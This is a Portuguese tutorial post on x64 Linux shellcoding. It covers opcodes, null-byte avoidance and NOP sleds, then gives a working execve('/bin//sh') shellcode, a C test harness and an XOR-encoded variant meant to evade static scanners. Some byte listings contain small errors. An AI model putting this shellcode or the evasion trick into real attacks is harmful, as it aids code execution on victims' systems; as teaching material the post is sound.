tendo entendido como funcionam os segmentos de memoria e como podemos executar memoria diretamente em um segmento, vamos falar sobre o que de fato viemos aqui, shellcoding

existe uma longa historia desta arte, mas hj vou falar especificamente nas praticas pra desenvolver um shellcode 

* a fim de esclarecer um pouco mais o assunto deixo aqui uma otima referencia sobre [registradores](https://pt.stackoverflow.com/questions/320285/o-que-s%C3%A3o-registradores-e-qual-%C3%A9-o-seu-funcionamento-b%C3%A1sico)

# conceitos basicos sobre set instructions e opcode 

uma dos primeiros elementos que sempre vamos ver ao revisar os estudos sobre shellcoding eh o `xor rax, rax`, caso vc nao saiba o que a operaçao xor recomendo procurar um pouco antes de prosseguir
//
Porem, neste caso estamos efetuando um `xor` no registrador `rax`, se conhecemos um pouco deste tipo de `byte operation` sabemos que efetuar um `xor` num mesmo elemento vai limpar o registrador

> mas nao seria mais facil simplesmente mover o 0 pra dentro da `rax` ( `mov rax, 0`) ou se quissermos complicar mais um poco, armazenar o zero dentro de algum address e carregar dentro do registrador (` lea rax, [address contendo 0]´)

 a questao aqui nao ta em simplesmente mover o 0 pra o registrador, mas que ao efetuar esse tipo de operaçao vamos ter o seguinte 
 
 eu compilei usando nasm o seguinte code onde limpo diversos tamanhos da `rax` usando `xor` e no final limpo os ultimos 8 bits com `mov`
 
```
 section .data
section .text
  global _start
 
_start:
  xor rax, rax
  xor rbx, rbx
  xor eax, eax
  xor ebx, ebx
  xor al, al
  mov ax, 0x0
```
 
 
 x64 nasm
```
  [endereço]	 [opcode]	[nosso code em assembly]

  0x00401000      4831c0         xor rax, rax   ; limpando a rax    
  0x00401003      4831db         xor rbx, rbx   ; limpando o rbx
  0x00401006      31c0           xor eax, eax   ; limpando os ultimos 32 bytes da rax (lembrando que os registradores em x64 sao do tamanho de uma QWORD) 
  0x00401008      31db           xor ebx, ebx   ; limpando os ultimos 32 bits do rbx
  0x0040100a      30c0           xor al, al	
  0x0040100c      b000           mov al, 0	; limpando os ultimos 8 bits da rax movendo 0 pra seu espaço
 
```
---- 

```
a fim de rever a abstraçao do registrador, vamos lembrar que na arquitetura x64 o registrador possui um tamanho total de 64bits, com outros sub-registradores pra apontar seus espaços, aqui vemos 
 uma representaçao da RAX, onde podemos observar os tamanhos e seus sub-registradores, que apontam pra cada espaço, ou seja, modificar o eax, significa modificar os ultimos 32 bits (espaços) da rax, ou modificar o ax, significa modificar os ultimos 16bits (espaços) da RAX
 
 
 [64	|32 	|16	|8	]  size : QWORD(64bits) | DWORD(32bits) | WORD(16bits) | BYTE(8) 
rax 	eax	ax|ah	 al
```

aqui podemos ver diversas coisas interessante, primeiramente irei falar sobre o `opcode`

----

bem, se eu for falar a profundidade sobre este assunto iria requerir bastante mais tempo e referencias, mas basicamente o `opcode` eh a instruçao a nivel de maquina, veja bem, quando escrevemos nosso code em assembly, nao estamos realmente escrevendo diretamente em linguagem de maquina, porem, estamos usando memonico, ou seja, simbolos que referenciam as declaraçoes, por isso nao podemos executar diretamente assembly na memoria, pq mesmo quando escrevemos em assembly precisamos de um assembler (`nasm`) pra poder criar o codigo-objeto, que vai ser o que realmente sera carregado na memoria e esse codigo objeto sao conjuntos e grupos de `opcode` que vai ser carregado diretamente na memoria pra ser processado

por isso pra criar nosso shellcode vamos precissar do conjunto de `opcode` (_set instruction_) que eh de fato o que foi montado pelo assembler apartir do nosso code em assembly 

[aqui uma explicaçao mais profunda e talvez clara](https://pt.stackoverflow.com/questions/458712/qual-a-diferen%C3%A7a-entre-c%C3%B3digo-de-opera%C3%A7%C3%A3o-opcode-instru%C3%A7%C3%A3o-de-m%C3%A1quina-e-conj)

> - e aqui o [manual de opcode](http://ref.x86asm.net/coder64.html)

		existem diversas referencias e cada designer de processador possui suas especificidades com relaçao ao conjunto de instruçoes (por exemplo, existem instruçoes especificas pra travar o barramento (o que permite ter uma comunicaçao entre processos melhor cordenada e evitar race-condition por exemplo) chamadas de açoes atomicas que sao melhor explicadas pelo professor tannenbaum, recomendo bastante ler sobre) 

entao, se formos analisar nosso code, temos os seguintes `set instructions`(conjunto de opcodes) `48 31 c0` `48 31 db` equivalentes ao `xor`nos registradores `rax` e `rbx` 
pra esclarecer mais um pouco este assunto vamos dar uma olhadinha no manual de opcode de x64 pra ver o que podemos encontrar por lah e pra isso vamos decompor o opcode em bits

o primeiro `opcode` que podemos ver eh `48` e `31` 

se procurarmos esses codes na tabela do manual vamos ver que `48` eh um opcode do tipo prefixo que aponta pra uma operaçao de escrita  em registrador `REX.W` com um operando de 64bits || e que `31` eh do tipo `primary opcode` (opcode primario) euqivalente o`xor`

pra `48` -> `REX.W` -> `64 Bit Operand Size`

`31` -> ..  -> `xor` -> `Logical Exclusive OR`

e temos `c0` como accesso da rax

eu sei que a principo parece um processo complexo, mas ao decompor em parte, dah pra ver que eh apenas questao de analisis pra entender 

e bem, assim podemos fazer com os outros conjuntos de opcode ateh chegar no ultimo // `b000` onde ao ler a tabela de opcode podemos ver que `b0` eh equivalente a `mov` com um tamanho de 8bits (`al`) e o conteudo `00` equivalente ao  bit `0x0` 

e se quisermos escrever 0x1 dentro do ax??
`mov ax, 0x1` 

logo vamos obter o seguinte `set instruction` // `66 b8 01 00` onde ao decompor os `opcodes` vemos que `66` corresponde a um prefixo pra operaçoes em espaços de 16bits e `b8` corresponde ao `mov` pra registradores de `16/32/64` bits
porem temos algo diferente aqui, os ultimos dois opcodes `0100`, entendemos que o 01 equivale ao byte 0x1, mas esse ultimo byte??
ai que ta uma questao interessante, estamos escrevendo num espaço de 2 bytes (8 bits) jah questamos nos referenciando ao `ax` e escrevemos apenas 1 byte nele, logo o ultimo byte ficou vazio

**e eh auqi onde chegamos em um dos primeiros fundamentos de desenvolvimento de shellcode, evitar o NULL (0x00)**

## porque devemos evitar o opcode 0x00

bem, isso aqui eh mais simples de responder, a questao eh que 0x00 corresponde em C ao final de um vetor ou ponteiro pra `char` e como jah vimos no ultimo post, nosso shellcode sera armazenado num vetor (ponteiro pra vetor) e dps sera executado como uma funçao por um ponteiro pra funçao
// converetendo assim nosso vetor de bytes em um espaço que sera apontado pelo `RIP` e executado, jah que como sabemos, o ponteiro escreve o conteudo diretamente em memoria e a definiçao do tipo `char` aloca cada `opdcode` do nossso shellcode a um byte em memoria

que eh justamente como os `set instructions` sao armazenados em memoria
// porem ao declarar um `0x00` ele sera lido como o final do vetor, se for o final do shellcode, perfeito, mas se for resultado de uma manipulaçao de registrador que resultou em esse estado, teriamos quebrado nosso shellcode no meio da execuçao 

mas como jah falei antes, podemos fazer isso manipulando os registradores de acordo com o conteudo que iremos escrever nele, por exemplo, se nosso conteudo equivale a uma WORD iremos accessar o `ax`, porem se este eh do tamanho de uma DWORD iremos accessar o `eax` 
espero que tenha ficado claro
// e pra limpar os registradores entre routinas podemos usar o `xor` 

# escrevendo um shellcode basico 
## ASLR e nop-slide
outra questao que quero tocar eh a do `opcode` nop-slide (`90`), basicamente consiste em desviar a execuçao ateh o ponto onde desejamos atingir nosso `jump` ou `eip`, ou seja deslizar `slide` a execuçao ateh o ponto que desejamos

lembram qndo falei do ASLR (Address space layout randomization), uma politica de segurança do kernel que posiciona de forma randomica a `stack`e o `heap` dentro das paginas de memoria (segmentos) pra evitar que exploits saibam com antecedencia a posiçao de uma instruçao em memoria (esse assunto tem bastante coisa inclusa, mas se quisserem dps volto pra fazer um post explicando)
// pois bem, com o nop-slide nao precissamos saber com antecedencia a posiçao precissa da instruçao ou do desvio, basta com posicionar os nop-slide de forma relativa ao endereço que queremos chegar, por exemplo, se queremos atingir o enderço 0xf7448 dentro da `stack` (ou do `heap`com `heap spraying`) onde temos o começo do nosso shellcode, num passado antes do ASLR poderiamos simplesmente adicionar um `jump` no endereço especifico porem nao teriamos como saber com antecedencia o endereço pra efetuar o `jump` jah que o segmento seria em um endereço diferente a cada execuçao // porem, com nop-slide, podemos simplesmente adicionar os deslizamentos apartir do ponto que sabemos onde nosso entry no buffer sera colocado, sem especificar o endereço

*recomendo ler sobre paginaçao de memoria, pra entender um pouco mais, porem, basicamente os primeiros bytes do endereço equivalem a pagina e o segmento em memoria e os ultimos equivalem ao endereço da instruçao que sera diferente a cada execuçao*

por exemplo, no endereço 0xfff7448  | 448 equivalem ao endereço da instruçao, como sabemos que este sera mutavel a cada execuçao,ou seja, em alguns casos pode ser 448 ou 442 ou 452 ou 444 
// logo nao podemos fazer um `jump` ao endereço 448 mas poderiamos saber que a distancia entre a primeira instruçao e nosso exploit equivale a 16 ou 32 bytes, logo poderiamos deslizar (`0x90`) 16 ou 32 posiçoes

se por exemplo sabemos que começamos no 0xfff74?? (??: random position) e temos uma distancia de 24 bytes, podemos simplesmente adicionar 24 nop-slide (`0x90`)*24 (cada nop-slide ocupa 1 byte) ateh atingir o endereço

porem nos nossos teste nao iremos precissar desta tecnica, mas eh interessante e necessario conhece-la em ambientes reais, tmb existem outra equivalente jah que alguns scanners identificam e notificam grandes sequencias de nop-slide ou ateh mesmo bloqueiam a execuçao 

____

## implementando uma syscall pra criar um novo processo apartir do /bin/sh 

bem, tendo entendido estes conceitos vamos de fato a começar um projeto simples onde vamos executar um novo processo

```
section .text
  global _start  

_start:           ; entrypoint 
  
    xor rdx, rdx  ; vamos zerar o rdx
    push rdx  ;  enviamos o registrador zerado ao topo da stack, eh interssante ver que carregamos o registrador inteiro zerado, afim de ocupar todo o espaço do registrador da stack rsp 

   mov eax, 0x68732f2f6e69622f  ; minha arquitetura eh little endian, ou seja, o byte de menor valor primeiro, neste caso vamos mover o equivalente a "hs//nib/" na stack, carregamos com / adicional pra enxer o registrador sem 0x00, ou seja, o tamanho da string eh equivalente ao do registrador (8bytes)
   
  push rax  ; carregamos o conteudo de rax ao topo da stack

  mov rdi, rsp  ; aqui, movemos o endereço do topo da stack pra o registrador rdi, nao estamos carregando o conteudo, estamos movendo o endereço do topo da stack, isso acontece pq a funçao execve() em x64 recebe um ponteiro pra um vetor de char
  
  push rdx  ; carregamos o conteudo de rdx na stack, neste caso nossa stack volta a ficar zerada

  push rdi  ; carregamos o conteudo do rdi pra o topo da stack, neste caso o endereço antigo do rsp que foi carregado no rdi

  mov    rsi, rsp  ; e agr movemos o endereço do topo da stack pra o registrador rsi / eu sei que essa parte ficou um pouco compexa, mas vou explicar 

  xor eax, eax 

  mov al, 03b     ; e movemos 59 (0x3b) pra os ultimos bytes da rax isso pq segundo a tabela de syscall do linux, a syscall 59 eh equivalente a execve()
  syscall        ; e agr fazemos a syscall, desnviando pra o nucleo 
  
```
 eu sei que ficou um pouquinho estranho, porem dps que eu explicar vai ficar mais claro

prototipo execve()
```c
int execve(const char *pathname, char *const _Nullable argv[],
                  char *const _Nullable envp[]);
                  
```
                  
depois de carregar o conteudo da `rax` na stack, fizemos algumas operaçoes que se referem a manipulaçao de ponteiro, ou seja, neste caso, um endereço que aponta pra vetor de char  
// por isso nao carregamos o conteudo diretamente na `rsi`, pq o prototipo de execve() espera como argumento um ponteiro pra um vetor, ou seja, um endereço que aponte a nossa string (_neste caso o topo da stack $rsp_), por isso movemos o endereço do topo da stack pra o registrador, em arquiteturas x86 poderiamos simplesmente carregar o conteudo (_neste caso poderiamos ter colocado o conteudo diretamente dentro do registrador ou carregar desde a stack_) porem em x64 precissamos referenciar o endereço 
//
dps carregamos o conteudo do rdx (zerado) na stack e dps carregamos o endereço que aponta ao espaço onde tem nossa string (anteriormente armazenado na rdi), jah que o prototipo de execve() espera um argv ou envp, neste caso nao precissamos disso, entao mandamos o argv zerado e o envp nao eh enviado

o layout pra syscall no posix eh bem simples, carregamos o numero euqivalente a syscall nas tabelas do sistema (ou POSIX) dentro da rax (_apenas pra x86 -- carregamos os argumentos nos outros reigstradores, se por exemplo eu quisse ter passado algum argumento na funçao, bastaria com ter carregado dentro do `ecx` (ou ter referenciado um endereço em stack contendo o vetor), no caso do prototipo de `execve()` podemos enviar os argumentos do binario (se tivessemos carregar o ls, poderiamos ter carregado o `path` pra ls no `ebx` e os argumentos `-all` no `ecx`_) --) e no rsi mandamos o endereço que aponta pra os argumentos da funçao, poderiamos ter armazenado o argv nele, neste caso nao foi necessario 

**recomendo ler as abstraçoes do linux pra syscall em assembly, disponivel com** ``man syscall``
lah podemos ver como e onde o kernel espera os argumentos pra diferentes arch
_____

agr vamos extrair os opcodes, pra isso vamos ensamblar usando nasm (ou o que seja da sua preferencia) e ligar o codigo-objeto dinamicamente

` nasm -f elf64 shellcode.asm`  

vai criar um codigo-objeto com o nome shellcode.o pra ligar dinamicamente 

 
`ld -m elf64 -s -o shellcode shellcode.o`

ao executar nosso binario ./shellcode vamos obter uma shell apartir do /bin/sh 
e vamos analisar com `objdump -d`
```
0000000000401000 <.text>:
  401000:	48 31 d2             	xor    %rdx,%rdx
  401003:	52                   	push   %rdx
  401004:	48 b8 2f 62 69 6e 2f 	movabs $0x68732f2f6e69622f,%rax
  40100b:	2f 73 68 
  40100e:	50                   	push   %rax
  40100f:	48 89 e7             	mov    %rsp,%rdi
  401012:	52                   	push   %rdx
  401013:	57                   	push   %rdi
  401014:	48 89 e6             	mov    %rsp,%rsi
  401017:	31 c0                	xor    %eax,%eax
  401019:	b0 3b                	mov    $0x3b,%al
  40101b:	0f 05                	syscall
```

e podemos usar grep pra extrair apenas o `set instruction` com uma expressao regular  **verifiquem o resultado e comparem com o original, as vezes as expressoes regulares deste tipo eliminam instruçoes iguais** pra isso deixarei uma referencia deexpressoes regulares pra extraçao de set instructions com  objdump, utilizem a que mais se adeque com o seu modelo [em alguns caso se o shellcode tiver incompleto vc pode receber erros de diversos tipos, por isso recomendo sempre verificar](https://www.commandlinefu.com/commands/view/6051/get-all-shellcode-on-binary-file-from-objdump)

`objdump -d shellcode | grep -Po '\s\K[a-f0-9]{2}(?=\s)' | sed 's/^/\\x/g' | perl -pe 's/\r?\n//' | sed 's/$/\n/'`

 
onde vamos obter `x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e\2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x31\xc0\xb0\x3b\x0f\x05`

### testando nosso shellcode 

e agr que obtemos nosso set instruction, basta armazenar na stack e criar um ponteiro pra funçao que aponte pra o endereço onde ta armazenado nosso shellcode
//
falei sobre isso no [post anterior](https://github.com/0x177git/memfd_pos-exploiting/blob/main/basic_concepts_of_stack.md#usando-o-segmento--da-stack-pra-testar-shellcode)
 

```c
 
 int main ()
{
  char  shellcode[] = "\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x31\xc0\xb0\x3b\x0f\x05";

    void(*f)() = (void(*)()) shellcode;
     f();
}

```
e compilamos `gcc  -z execstack  shellcode.c -o shellcode` e temos nosso primeiro shellcode 

# consideraçoes finais sobre shellcoding

bem, esse post ficou maior do que eu esperava, mas meu intuito foi explicar de uma forma bem tranquila as abstraçoes que compoem o shellcoding, apartir deste momento e tendo entendido o que expliquei, ha a frente um horizonte conhecido ( e as vezes desconhecido) a explorar
bem-vindo <3

deixo aqui um shellcode um pouco mais complexo no qual uso xor pra encriptar o argumento `/bin//sh` e enviar ao `execve()`, nao eh mto avançado e acho um `sample` interessante pra quem ta começando e quer aprender a brincar com esta arte, eh bem legal jah que com este shellcode podemos driblar alguns scanners e metodos de segurança estaticos (_pq nao escrevemos a string no shellcode, ela vai ser decriptada no stack_)

```
section .text
  global _start
 
_start:
 xor rdx, rdx
 xor eax, eax
 mov qword [rsp-32], 0x7466684b ; 
 mov qword [rsp-28], 0x60650b1d  ; 0x60,  0x65,  0xb,  0x1d,  0x74,  0x66,  0x68,  0x4b (/bin//sh encriptado)
 xor qword [rsp-32], 0x1a0f0a64 ; chave (8 , 16, 24, 32, 1a, f, a, 64)
 xor qword [rsp-28], 0x08162432 ;   
 lea rdi, [rsp-32] ; carrego o endereço que aponta pra string no rdi 
 push rax ; 
 push rdi ; carrego no rsp
 lea rsi, [rsp] ; mando o endereço ao rsi
 

  mov al, 0x3b 
  syscall
 
 ```
 
 

